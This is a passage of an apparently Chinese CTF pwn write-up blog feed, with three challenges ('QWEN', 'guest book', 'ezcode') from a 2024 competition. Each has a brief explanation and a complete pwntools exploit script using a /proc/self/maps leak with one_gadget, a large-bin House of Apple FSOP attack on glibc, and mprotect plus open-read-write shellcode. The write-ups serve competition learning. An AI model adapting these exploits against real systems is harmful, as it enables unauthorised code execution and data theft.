class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="QWEN"><a href="#QWEN" class="headerlink" title="QWEN"></a>QWEN</h2><p>当输入的位置越界之后会调用<code>a1</code>，所以先赢了游戏之后覆盖<code>a1</code>为<code>backdoor</code>，可以有限制的读文件，读<code>/proc/self/maps</code>泄露<code>libc</code>地址之后打<code>ogg</code>，直接打会失败，先返回到<code>main</code>重新运行再打<code>ogg</code>平衡栈，远程用<code>pwn2</code>压缩<code>flag</code>直接<code>cat</code>拿到<code>flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-c9c758156e.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">game</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 0'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'say?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'game'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'15 15'</span><span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x1508</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x6b8b4567</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'logged'</span><span class="token punctuation">,</span> <span class="token string">b'/proc/self/maps'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>start <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x9E0</span>main_addr <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x17B3</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc.so.6'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0x10a2fc</span> <span class="token operator">+</span> libc_basep1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="guest-book"><a href="#guest-book" class="headerlink" title="guest book"></a>guest book</h2><p>直接套<code>large bin</code>的<code>hosue of apple</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-f29b87ed3e.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x540</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x520</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x530</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x21ace0</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x17</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x17</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x290</span>_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>_IO_wfile_jumps <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000114723</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a47</span><span class="token punctuation">,</span> <span class="token number">0xebc81</span><span class="token punctuation">,</span> <span class="token number">0xebc85</span><span class="token punctuation">,</span> <span class="token number">0xebc88</span><span class="token punctuation">,</span> <span class="token number">0xebce2</span><span class="token punctuation">,</span> <span class="token number">0xebd3f</span><span class="token punctuation">,</span> <span class="token number">0xebd43</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basedelete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x290</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">61</span>target_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>p2 <span class="token operator">=</span> <span class="token string">b'\x00'</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">+</span> <span class="token number">0xe0</span> <span class="token operator">+</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h2><p><code>json</code>构造一次<code>mprotect</code>和<code>read</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> jsoncontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-ff73d874f7.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov ax, 10shl edi, 12mov dx, 0x7syscall'''</span>shellcode <span class="token operator">=</span> <span class="token string">b'66 b8 0a 00 c1 e7 0c 66 ba 07 00 0f 05'</span><span class="token triple-quoted-string string">'''cdqmov esi, edixor eax, eaxxor edi, edisyscall'''</span>shellcode <span class="token operator">+=</span> <span class="token string">b'99 89 fe 31 c0 31 ff 0f 05 '</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b" "</span><span class="token punctuation">,</span> <span class="token string">b""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"shellcode"</span><span class="token punctuation">:</span> shellcode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>json_string <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input'</span><span class="token punctuation">,</span> json_string<span class="token punctuation">)</span>shellcode_orw <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall'''</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">0xff</span><span class="token operator">+</span>asm<span class="token punctuation">(</span><span class="token string">"shl rsp, 12; add rsp, 0x500;"</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcode_orw<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn&quot;&gt;https://github.com/0xviol</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>只能接受特定格式的msgbot-protobuf+可见字符shellcode</title>
    <link href="https://starrysky1004.github.io/2024/10/13/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/"/>
    <id>https://starrysky1004.github.io/2024/10/13/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/</id>
    <published>2024-10-13T07:37:04.000Z</published>
    <updated>2025-01-14T09:59:07.194Z</updated>
    
